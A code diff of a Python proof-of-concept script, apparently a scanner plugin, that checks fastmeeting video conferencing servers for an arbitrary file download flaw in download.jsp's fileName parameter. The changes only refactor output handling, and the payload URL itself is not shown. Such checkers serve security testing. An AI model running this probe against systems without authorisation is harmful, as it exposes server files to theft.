@@ -8,8 +8,8 @@ description: 文件/dbbackup/adminMgr/download.jsp中,参数fileName存在任意
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class fastmeeting_download_filedownload_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class fastmeeting_download_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在好视通视频会议系统(fastmeeting)任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在好视通视频会议系统(fastmeeting)任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = fastmeeting_download_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
